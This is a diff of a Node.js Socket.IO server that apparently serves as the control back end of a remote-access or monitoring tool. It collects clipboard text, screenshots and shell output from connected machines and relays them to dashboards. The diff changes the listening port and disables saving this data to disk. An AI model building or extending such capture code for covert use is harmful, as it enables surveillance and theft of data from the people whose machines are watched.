@@ -2,12 +2,12 @@ const fs = require('fs');
 const path = require('path');
 
 const logDir = path.join(__dirname, 'logs');
-if (!fs.existsSync(logDir)) fs.mkdirSync(logDir);
+// if (!fs.existsSync(logDir)) fs.mkdirSync(logDir);
 
 const express = require('express');
 const app = express();
 
-app.use('/logs', express.static(logDir));
+// app.use('/logs', express.static(logDir));
 const httpServer = require('http').createServer(app);
 const io = require('socket.io')(httpServer, { cors: {origin: "*"}});
 
@@ -15,7 +15,7 @@ const clients = {}; // nodeId => { name, user, address, socketId, state }
 const dashboardSockets = new Set(); // Store web dashboards
 
 
-httpServer.listen(80);
+httpServer.listen(3000);
 
 io.on("connection", (socket) => {
     console.log("Client connected:", socket.id);
@@ -133,11 +133,24 @@ io.on("connection", (socket) => {
 
     socket.on("clipboard_text", (payload) => {
         // payload: { nodeId, text }
-        const nodeId = payload.nodeId || Object.keys(clients).find(key => clients[key].socketId === socket.id);
-        const text = payload.text || payload;
-        const logFile = nodeId ? path.join(logDir, `${nodeId}.log`) : path.join(logDir, `unknown.log`);
-        const entry = `[${new Date().toLocaleString()}] ${text}\n`;
-        fs.appendFile(logFile, entry, () => {});
+        const nodeId = payload && payload.nodeId
+            ? payload.nodeId
+            : Object.keys(clients).find(key => clients[key].socketId === socket.id);
+
+        let text = "";
+        if (payload && typeof payload.text === "string") {
+            // Normal case: explicit text from client
+            text = payload.text;
+        } else if (typeof payload === "string") {
+            // Backwards-compat: raw string payload
+            text = payload;
+        } else {
+            // Anything else: treat as empty string
+            text = "";
+        }
+        // const logFile = nodeId ? path.join(logDir, `${nodeId}.log`) : path.join(logDir, `unknown.log`);
+        // const entry = `[${new Date().toLocaleString()}] ${text}\n`;
+        // fs.appendFile(logFile, entry, () => {});
 
         // Broadcast clipboard result to all dashboards so there is no race
         // condition when multiple nodes are requested close together.
@@ -152,29 +165,29 @@ io.on("connection", (socket) => {
     socket.on("screenshot", (data) => {
         const nodeId = data.nodeId;
         const images = data.images;
-        // Ensure directory before saving screenshot
-        const nodeDir = path.join(logDir, nodeId);
-        if (!fs.existsSync(nodeDir)) fs.mkdirSync(nodeDir, {recursive:true});
+        // // Ensure directory before saving screenshot
+        // const nodeDir = path.join(logDir, nodeId);
+        // if (!fs.existsSync(nodeDir)) fs.mkdirSync(nodeDir, {recursive:true});
         if (images && images.length > 0) {
             images.forEach((img, index) => {
                 const timestamp = new Date().toISOString().replace(/[:.-]/g, '');
                 const screenIdx = img.screenIdx;
                 const fileName = `${timestamp}_screen${screenIdx}.jpg`;
-                const filePath = path.join(nodeDir, fileName);
-                fs.writeFile(filePath, img.base64, 'base64', (err) => {
-                    if (err) {
-                        console.error(`Error saving screenshot for ${nodeId}:`, err);
-                    } else {
-                        const url = `/logs/${nodeId}/${fileName}`;
-                        dashboardSockets.forEach(dash => {
-                            dash.emit("screenshot", {
-                                client: nodeId,
-                                img: url,
-                                ts: img.ts
-                            });
-                        });
-                    }
-                });
+                const filePath = path.join(logDir, nodeId, fileName);
+                // fs.writeFile(filePath, img.base64, 'base64', (err) => {
+                //     if (err) {
+                //         console.error(`Error saving screenshot for ${nodeId}:`, err);
+                //     } else {
+                //         const url = `/logs/${nodeId}/${fileName}`;
+                //         dashboardSockets.forEach(dash => {
+                //             dash.emit("screenshot", {
+                //                 client: nodeId,
+                //                 img: url,
+                //                 ts: img.ts
+                //             });
+                //         });
+                //     }
+                // });
             });
         }
     });
@@ -229,9 +242,9 @@ io.on("connection", (socket) => {
         if (!nodeId) return;
 
         // Optional: append shell output into the same log file
-        const logFile = path.join(logDir, `${nodeId}.log`);
-        const entry = `[${new Date().toLocaleString()}] [SHELL] ${output}\n`;
-        fs.appendFile(logFile, entry, () => {});
+        // const logFile = path.join(logDir, `${nodeId}.log`);
+        // const entry = `[${new Date().toLocaleString()}] [SHELL] ${output}\n`;
+        // fs.appendFile(logFile, entry, () => {});
 
         // Broadcast shell result to all dashboards
         dashboardSockets.forEach(dash => {
